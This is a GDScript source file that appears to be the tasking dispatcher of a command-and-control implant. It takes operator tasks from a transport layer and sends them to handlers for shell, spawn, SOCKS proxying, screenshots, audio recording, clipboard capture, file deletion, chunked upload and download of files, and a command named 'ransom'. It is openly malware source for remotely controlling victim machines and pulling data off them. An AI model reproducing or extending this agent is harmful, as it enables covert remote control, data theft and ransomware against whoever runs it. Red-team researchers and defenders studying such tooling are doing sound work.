extends Node

var parent
var transport
var task_id_to_last_action

signal cat
signal clipboard
signal cover
signal cp
signal curl
signal cwd
signal download
signal download_chunk
signal download_start
signal exit
signal gdscript
signal kill
signal ls
signal mv
signal upload
signal upload_start
signal upload_chunk
signal ransom
signal record
signal rm
signal screenshot
signal shell
signal sleep
signal socks
signal spawn
signal whoami

func _ready():
	parent = $".".get_parent()

	transport = parent.get_node("transport")
	task_id_to_last_action = {}


func _on_transport_tasking(data):

	if data.has("payload") and data.get("payload").has("socks"):

		for sock in data.get("payload").get("socks"):
			emit_signal("socks", transport, sock)


	if data.has("payload") and data.get("payload").has("tasks"):

		for task in data.get("payload").get("tasks"):
			var command = task.get("command")

			match command:
				"screenshot":
					task_id_to_last_action[task.get("id")] = command
				"download":
					task_id_to_last_action[task.get("id")] = command
				"upload":
					task_id_to_last_action[task.get("id")] = command
				_:
					print_debug("default tasking... ", task)

			if has_signal(command):
				emit_signal(command, transport, task)


func _on_transport_post_response(data):
	var payload = data.get("payload")

	for response in payload.get("responses"):
		var task_id = response.get("task_id")

		if response.get("status") == "success":

			match task_id_to_last_action.get(task_id):
				"upload":
					if response.has("file_id"):
						emit_signal("upload_start", response)
						task_id_to_last_action[task_id ] = "upload_chunk"
					else:
						print_debug("Bad upload response: ", response)
				"upload_chunk":
					if response.has("file_id"):
						emit_signal("upload_chunk", response)
						task_id_to_last_action[task_id ] = "upload_chunk"
					else:
						print_debug("Bad upload response: ", response)
				"download":
					if response.has("file_id"):
						emit_signal("download_start", response)
						task_id_to_last_action[task_id ] = "download_chunk"
					else:
						print_debug("Bad download response: ", response)
				"download_chunk":
					emit_signal("download_chunk", response)
					task_id_to_last_action[task_id ] = "download_chunk"
				"screenshot":
					if response.has("file_id"):
						emit_signal("download_start", response)
						task_id_to_last_action[task_id ] = "download_chunk"
					else:
						print_debug("Bad screenshot response: ", response)
		else:
			print_debug("failed response: ", response)
